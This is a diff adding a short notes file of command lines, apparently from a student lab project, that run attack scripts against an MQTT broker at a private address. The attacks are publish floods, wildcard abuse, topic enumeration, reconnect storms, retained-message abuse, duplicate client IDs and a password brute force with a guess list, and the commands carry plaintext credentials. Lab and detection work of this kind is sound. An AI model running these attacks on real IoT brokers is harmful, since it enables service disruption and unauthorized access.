@@ -1,1 +1,15 @@
-
+publish flood
+python .\DoAnIA-master12-main\DoAnIA-master12-main\attack-tls\publish_flood.py --broker 192.168.101.144 --port 8883 --username telegraf --password telegraf123 --workers 5 --messages 1000 --delay 10  --ca .\certs\ca-cert.pem
+wildcard abuse
+python .\DoAnIA-master12-main\DoAnIA-master12-main\attack-tls\wildcard_abuse.py --broker 192.168.101.144 --port 8883 --username giamdoc --password 123 --workers 2 --duration 60 --ca .\certs\ca-cert.pem
+topic_enum
+python .\DoAnIA-master12-main\DoAnIA-master12-main\attack-tls\topic_enumeration.py --broker 192.168.101.144 --port 8883  --workers 20 --user giamdoc --password 123 --ca .\certs\ca-cert.pem
+reconect_strom
+python .\DoAnIA-master12-main\DoAnIA-master12-main\attack-tls\reconnect_storm.py --broker 192.168.101.144 --port 8883   --workers 5 --reconnects 100 --username giamdoc --password 123   --ca .\certs\ca-cert.pem
+retain_qos(powershell)
+$topics = 1..500 | ForEach-Object { "factory/office/Device{0:D3}/telemetry" -f $_ }
+>> python .\retain_qos_abuse.py --type mixed --broker 192.168.101.144 --port 8883 --workers 5 --messages 40 --delay 50 --topics $topics --username giamdoc --password 123 --ca .\certs\ca-cert.pem
+duplicate_id
+python .\DoAnIA-master12-main\DoAnIA-master12-main\attack-tls\duplicate_id.py --broker 192.168.101.144 --port 8883 --client-id production-production-sensorair1-replayer-replayer --type simultaneous --workers 5 --attempts 20 --delay 500 --username giamdoc --password 123 --ca .\certs\ca-cert.pem
+bruteforce_exploit
+python .\attack-tls\brute_force_exploit.py --broker 192.168.101.144 --port 8883 --target-username production-sensorflame1-replayer --ca .\certs\ca-cert.pem --tls --custom-passwords "123456" "password" "admin" "1234" "0000" "1111" "8888" "12345" "12345678" "123456789" "sensor123" "flamel123" "production123" "flame123" "sensor" "flamel" "production" "replayer" "sensorflamel" --delay 50 --workers 2 --min-length 7 --max-length 8
